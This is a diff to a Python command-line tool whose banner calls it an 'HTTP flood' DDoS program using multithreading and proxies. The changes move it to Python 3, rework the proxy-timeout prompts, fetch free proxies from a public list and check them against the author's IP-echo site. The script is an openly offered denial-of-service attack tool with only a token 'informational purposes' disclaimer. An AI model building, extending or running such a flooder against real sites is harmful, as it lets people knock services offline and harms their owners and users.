@@ -1,4 +1,5 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+# Dev: FSystem88
 # -*- coding: utf-8 -*-
 import requests as r, os, threading, sys, random, re, time, click
 from threading import Thread
@@ -44,7 +45,7 @@ def randomString(size):
 
 def check(ip, prox, qtime):
 	try:
-		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=qtime).text
+		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, timeout=qtime).text
 	except:
 		ipx = ip
 	if ip != ipx:
@@ -83,9 +84,10 @@ def start_ddos(prox, url, headers, proxies, color):
 		pass
 
 @click.command()
-@click.option('--proxy', help="File with a proxy")
+@click.option('--proxy', '-p', help="File with a proxy")
 def main(proxy):
 	clear()
+	
 	def logo():
 		print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир® ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n"+Style.RESET_ALL)
 	logo()
@@ -93,33 +95,45 @@ def main(proxy):
 	if url[:4] != "http":
 		print(Fore.RED+"Enter the full link (example: http*://****.**/)"+Style.RESET_ALL)
 		exit()
-	qtime = input("Timeout of requests (default 5): ")
-	try:
-		if qtime == "":
-			qtime = 5
-		else:
-			qtime = int(qtime)
-	except:
-		print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
-		exit()
 	if proxy == None:
 		req = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
 		array = req.text.split()
+		qtime = input("Timeout of requests (default 5): ")
+		try:
+			if qtime == "":
+				qtime = 5
+			else:
+				qtime = int(qtime)
+		except:
+			print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
+			exit()
 		check_prox(array, qtime)
 		proxfile = "ddprox.txt"
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
-			val = input("Found {} proxies in {}.\nCheck the proxy for validity? (y/n)".format(len(array), proxy))
+			val = input("Found {} proxies in {}.\nCheck the proxy for validity? (y/n) ".format(len(array), proxy))
 			if val == "y":
+				qtime = input("Timeout of requests (default 5): ")
+				try:
+					if qtime == "":
+						qtime = 5
+					else:
+						qtime = int(qtime)
+				except:
+					print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
+					exit()
 				check_prox(array, qtime)
 			else:
-				print(Fore.YELLOW+"Cancel...")
+				print(Fore.YELLOW+"Cancel..."+Style.RESET_ALL)
 			proxfile = proxy
 		except FileNotFoundError:
-			print(Fore.RED+"File {} not found. ".format(proxy)+Style.RESET_ALL)
+			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
 			exit()
+
+	
+
 	clear()
 	logo()
 	fx = open(proxfile)
